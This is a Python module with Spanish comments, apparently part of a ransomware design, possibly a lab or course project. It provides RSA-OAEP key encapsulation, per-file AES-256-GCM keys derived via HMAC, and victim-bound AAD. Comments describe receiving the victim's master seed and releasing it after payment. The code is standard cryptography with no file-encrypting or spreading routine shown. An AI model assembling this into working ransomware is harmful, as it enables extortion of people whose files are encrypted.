"""
comun/crypto_common.py
Funciones criptográficas compartidas: RSA-OAEP, HMAC-SHA256 para derivar
claves por archivo, y AES-256-GCM con AAD.
"""

import secrets
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Hash import SHA256, HMAC

# ---------------------------------------------------------------------------
# Generación de claves RSA
# ---------------------------------------------------------------------------

def generar_par_rsa(bits=2048):
    """Genera un par RSA >= 2048 bits. Devuelve (clave_privada, clave_publica)
    como objetos RSA de PyCryptodome."""
    clave_privada = RSA.generate(bits)
    clave_publica = clave_privada.publickey()
    return clave_privada, clave_publica

def exportar_publica(clave_publica):
    """Para enviar por red: deja la pública como (n, e) en string."""
    return {"n": str(clave_publica.n), "e": clave_publica.e}

def reconstruir_publica(datos):
    """Inversa de exportar_publica."""
    return RSA.construct((int(datos["n"]), int(datos["e"])))


# ---------------------------------------------------------------------------
# RSA-OAEP: el servidor solo necesita desencapsular (recibe sV de la víctima)
# ---------------------------------------------------------------------------

def desencapsular_oaep(clave_privada, encapsulacion):
    """Descifra con skS la entrega OAEP y devuelve la semilla maestra sV
    (32 bytes). Lanza ValueError si el formato no es válido."""
    oaep = PKCS1_OAEP.new(clave_privada, hashAlgo=SHA256)
    secreto = oaep.decrypt(encapsulacion)
    if len(secreto) != 32:
        raise ValueError("Se esperaba una semilla maestra de 32 bytes.")
    return secreto

def encapsular_oaep(clave_publica, secreto):
    """Cifra un secreto de 32 bytes con OAEP. La usa el servidor en la
    recuperación por pago (5a), reenviando sV cifrada con pkV."""
    oaep = PKCS1_OAEP.new(clave_publica, hashAlgo=SHA256)
    return oaep.encrypt(secreto)


# ---------------------------------------------------------------------------
# Derivación de la clave por archivo: Ki = HMAC-SHA256(sV, i en 8 bytes BE)
# ---------------------------------------------------------------------------

def derivar_clave_Ki(semilla_maestra, indice):
    """semilla_maestra: 32 bytes (sV). indice: entero >= 0.
    Devuelve 32 bytes para usar directo como clave AES-256."""
    mensaje = indice.to_bytes(8, "big")
    h = HMAC.new(semilla_maestra, digestmod=SHA256)
    h.update(mensaje)
    return h.digest()


# ---------------------------------------------------------------------------
# AES-256-GCM con AAD: nonce de 12 bytes, etiqueta de 16 bytes
# ---------------------------------------------------------------------------

def construir_aad(id_victima, indice):
    """AAD acordado: idV (utf-8) || i (8 bytes big-endian)."""
    return id_victima.encode("utf-8") + indice.to_bytes(8, "big")

def cifrar_con_aad(clave, datos, aad):
    """Devuelve (nonce, etiqueta, ciphertext). Nonce aleatorio de 12 bytes
    generado por la biblioteca -- no lo reutilicen con la misma clave."""
    nonce = secrets.token_bytes(12)
    aes = AES.new(clave, AES.MODE_GCM, nonce=nonce, mac_len=16)
    aes.update(aad)
    ciphertext, etiqueta = aes.encrypt_and_digest(datos)
    return nonce, etiqueta, ciphertext

def descifrar_con_aad(clave, nonce, etiqueta, ciphertext, aad):
    """Lanza ValueError si la etiqueta no verifica (dato alterado o clave
    incorrecta). Nunca devuelve datos sin verificar."""
    aes = AES.new(clave, AES.MODE_GCM, nonce=nonce, mac_len=16)
    aes.update(aad)
    return aes.decrypt_and_verify(ciphertext, etiqueta)
